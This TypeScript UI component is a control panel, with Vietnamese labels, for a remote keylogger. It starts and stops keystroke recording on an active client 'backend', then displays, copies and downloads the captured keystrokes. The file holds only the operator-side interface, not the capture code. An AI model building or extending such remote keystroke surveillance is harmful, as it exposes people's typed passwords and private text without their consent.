/**
 * Keylog View Component
 * Real-time keylogger display with controls
 */

import { StateManager } from '../services/StateManager';

export function KeylogView(initialBuffer: string = ''): HTMLElement {
  const container = document.createElement('div');
  container.className = 'keylog-view';

  const backendId = StateManager.getActiveBackend();
  const clientState = backendId ? StateManager.getClientState(backendId) : null;
  const isActive = clientState?.keylogger === 'active';

  container.innerHTML = `
    <div class="flex items-center justify-between mb-4">
      <h3 class="text-2xl font-semibold">Keylogger</h3>
      <div class="flex items-center gap-3">
        <span class="badge ${isActive ? 'badge-success' : 'badge-info'}" id="keylog-status">
          ${isActive ? '● Recording' : '○ Stopped'}
        </span>
        <button class="btn ${isActive ? 'btn-danger' : 'btn-success'} btn-sm" id="btn-toggle-keylog">
          ${isActive ? '⏹ Dừng' : '▶ Bắt đầu'}
        </button>
      </div>
    </div>

    <!-- Keylog Feed -->
    <div class="keylog-feed-wrapper glass-card">
      <div class="keylog-header flex items-center justify-between p-3 border-b border-subtle">
        <span class="text-sm text-muted">Keystroke Log</span>
        <div class="flex gap-2">
          <button class="btn btn-ghost btn-sm" id="btn-copy" title="Copy to clipboard">
            📋
          </button>
          <button class="btn btn-ghost btn-sm" id="btn-clear" title="Clear display">
            🗑️
          </button>
          <button class="btn btn-ghost btn-sm" id="btn-download-log" title="Download log">
            📥
          </button>
        </div>
      </div>
      <div class="keylog-feed" id="keylog-feed">${escapeHtml(initialBuffer) || '<span class="text-muted">Chưa có dữ liệu...</span>'}</div>
    </div>

    <!-- Statistics -->
    <div class="keylog-stats mt-4 grid gap-4" style="grid-template-columns: repeat(3, 1fr);">
      <div class="stat-mini glass-card p-4 text-center">
        <div class="stat-value-mini" id="stat-chars">${initialBuffer.length}</div>
        <div class="stat-label-mini">Ký tự</div>
      </div>
      <div class="stat-mini glass-card p-4 text-center">
        <div class="stat-value-mini" id="stat-words">${countWords(initialBuffer)}</div>
        <div class="stat-label-mini">Từ</div>
      </div>
      <div class="stat-mini glass-card p-4 text-center">
        <div class="stat-value-mini" id="stat-lines">${countLines(initialBuffer)}</div>
        <div class="stat-label-mini">Dòng</div>
      </div>
    </div>

    <p class="text-xs text-muted mt-4">
      💡 Dữ liệu được lưu trữ cục bộ và tự động cập nhật khi có keystroke mới.
    </p>
  `;

  // Add component-specific styles
  const style = document.createElement('style');
  style.textContent = `
    .keylog-feed-wrapper {
      overflow: hidden;
    }

    .keylog-feed {
      height: 300px;
      overflow-y: auto;
      padding: var(--space-4);
      font-family: var(--font-mono);
      font-size: var(--text-sm);
      line-height: 1.8;
      white-space: pre-wrap;
      word-break: break-all;
      background: var(--bg-base);
    }

    .border-subtle {
      border-color: var(--border-subtle);
    }

    .stat-value-mini {
      font-size: var(--text-xl);
      font-weight: 600;
      color: var(--aurora-cyan);
    }

    .stat-label-mini {
      font-size: var(--text-xs);
      color: var(--text-muted);
      margin-top: var(--space-1);
    }

    /* Highlight special keys */
    .key-special {
      padding: 2px 6px;
      background: var(--bg-elevated);
      border-radius: var(--radius-sm);
      color: var(--aurora-cyan);
      font-size: 0.85em;
    }
  `;
  container.appendChild(style);

  // Event handlers
  setTimeout(() => {
    const btnToggle = container.querySelector('#btn-toggle-keylog') as HTMLButtonElement;
    const statusBadge = container.querySelector('#keylog-status') as HTMLElement;
    const feed = container.querySelector('#keylog-feed') as HTMLElement;
    const btnCopy = container.querySelector('#btn-copy') as HTMLButtonElement;
    const btnClear = container.querySelector('#btn-clear') as HTMLButtonElement;
    const btnDownload = container.querySelector('#btn-download-log') as HTMLButtonElement;
    const statChars = container.querySelector('#stat-chars') as HTMLElement;
    const statWords = container.querySelector('#stat-words') as HTMLElement;
    const statLines = container.querySelector('#stat-lines') as HTMLElement;

    let buffer = initialBuffer;

    btnToggle.addEventListener('click', () => {
      const backendId = StateManager.getActiveBackend();
      if (!backendId) return;

      const clientState = StateManager.getClientState(backendId);

      if (clientState.keylogger === 'active') {
        // STOP - Instant, no waiting
        StateManager.setClientState(backendId, 'keylogger', 'idle');
        StateManager.sendToActive('keylog_stop');

        btnToggle.className = 'btn btn-success btn-sm';
        btnToggle.textContent = '▶ Bắt đầu';
        statusBadge.className = 'badge badge-info';
        statusBadge.textContent = '○ Stopped';
      } else {
        // START - No loading state for keylogger (instant)
        StateManager.setClientState(backendId, 'keylogger', 'active');
        StateManager.sendToActive('keylog_start');

        btnToggle.className = 'btn btn-danger btn-sm';
        btnToggle.textContent = '⏹ Dừng';
        statusBadge.className = 'badge badge-success';
        statusBadge.textContent = '● Recording';
      }
    });

    btnCopy.addEventListener('click', () => {
      navigator.clipboard.writeText(buffer);
      // Flash feedback
      btnCopy.textContent = '✓';
      setTimeout(() => btnCopy.textContent = '📋', 1000);
    });

    btnClear.addEventListener('click', () => {
      if (confirm('Xóa toàn bộ log hiển thị?')) {
        buffer = '';
        feed.textContent = '';
        updateStats();
      }
    });

    btnDownload.addEventListener('click', () => {
      const blob = new Blob([buffer], { type: 'text/plain' });
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = `keylog_${Date.now()}.txt`;
      a.click();
      URL.revokeObjectURL(url);
    });

    function updateStats() {
      statChars.textContent = String(buffer.length);
      statWords.textContent = String(countWords(buffer));
      statLines.textContent = String(countLines(buffer));
    }

    // Expose update function for external calls
    (container as any).appendKeylog = (data: string) => {
      buffer += data;
      feed.textContent = buffer;
      feed.scrollTop = feed.scrollHeight;
      updateStats();
    };
  }, 0);

  return container;
}

function escapeHtml(text: string): string {
  const div = document.createElement('div');
  div.textContent = text;
  return div.innerHTML;
}

function countWords(text: string): number {
  return text.trim().split(/\s+/).filter(w => w.length > 0).length;
}

function countLines(text: string): number {
  return text.split('\n').length;
}
